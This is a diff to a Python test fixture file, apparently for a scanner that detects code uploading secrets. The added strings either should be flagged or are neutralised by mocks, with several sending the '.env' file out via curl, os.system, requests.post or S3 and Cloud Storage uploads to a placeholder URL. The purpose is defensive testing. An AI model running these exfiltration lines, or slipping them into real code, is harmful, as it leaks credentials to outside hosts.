@@ -247,6 +247,17 @@ _PYTHON_UPLOAD_CODE = [
     f"mock = 0\nimport requests\nrequests.post('{_URL}', data=open('.env').read())",
     f"import unittest.mock\nimport requests\nrequests.post('{_URL}', data=open('.env').read())",
     f"from unittest import mock\nimport requests\nwith mock.patch('httpx.post'):\n    requests.post('{_URL}', data=d)",
+    # A mock of another module's member named like a runner or an object
+    # store, such as platform.system, hides no shell command or upload.
+    (
+        "from unittest import mock\nimport subprocess\nwith mock.patch('platform.system', return_value='Linux'):\n"
+        f"    pass\nsubprocess.run(['curl', '-d', '@.env', '{_URL}'])"
+    ),
+    f"from unittest import mock\nimport os\nmock.patch('app.executor').start()\nos.system('curl -d @.env {_URL}')",
+    (
+        "from unittest import mock\nimport boto3\nwith mock.patch('app.storage.backend'):\n"
+        "    pass\nboto3.client('s3').upload_file('.env', 'b', 'k')"
+    ),
     # An upload function imported, bound or fetched with getattr, then called or passed on.
     f"from requests import post\nfrom concurrent.futures import ThreadPoolExecutor\nThreadPoolExecutor().map(post, ['{_URL}'])",
     f"import requests\nfn = getattr(requests, 'post')\nfn('{_URL}', data=d)",
@@ -774,6 +785,21 @@ _CODE_THAT_SENDS_NOTHING = [
         "from unittest import mock\nimport subprocess\nwith mock.patch('subprocess.run'):\n"
         "    subprocess.run(['curl', '-d', '@.env', 'https://example.com'])"
     ),
+    # A mock of a runner or an object store, by its module and member.
+    (
+        "import os\n\n\ndef test_upload(monkeypatch):\n    monkeypatch.setattr(os, 'system', lambda command: 0)\n"
+        "    os.system('curl -d @.env https://example.com')\n"
+    ),
+    "from unittest import mock\nimport os\nmock.patch('os.execvp').start()\nos.system('curl -d @.env https://example.com')",
+    (
+        "from unittest import mock\nimport boto3\nclient = boto3.client('s3')\n"
+        "with mock.patch.object(client, 'upload_file'):\n    client.upload_file('.env', 'b', 'k')"
+    ),
+    (
+        "from unittest import mock\nfrom google.cloud import storage\n"
+        "with mock.patch('google.cloud.storage.Client'):\n"
+        "    storage.Client().bucket('b').blob('k').upload_from_filename('.env')"
+    ),
     # A mock of the client's class, transport or upload method.
     (
         "from unittest import mock\nimport requests\nwith mock.patch('requests.Session') as s:\n"
@@ -794,6 +820,11 @@ _CODE_THAT_SENDS_NOTHING = [
 # JavaScript servers, tests and downloads, read as a here-document, as a code
 # argument, and as a script the call writes and starts.
 _JS_THAT_SENDS_NOTHING = [
+    # A spy on child_process's execSync, through the name the code binds it to.
+    (
+        "const cp = require('child_process');\njest.spyOn(cp, 'execSync').mockReturnValue('');\n"
+        "cp.execSync('curl -d @.env https://example.com');"
+    ),
     (
         "const app = require('express')();\napp.route('/book')\n  .get((request, response) => response.send('x'))\n"
         "  .post((request, response) => response.send('y'))\n  .put((request, response) => response.send('z'));\n"
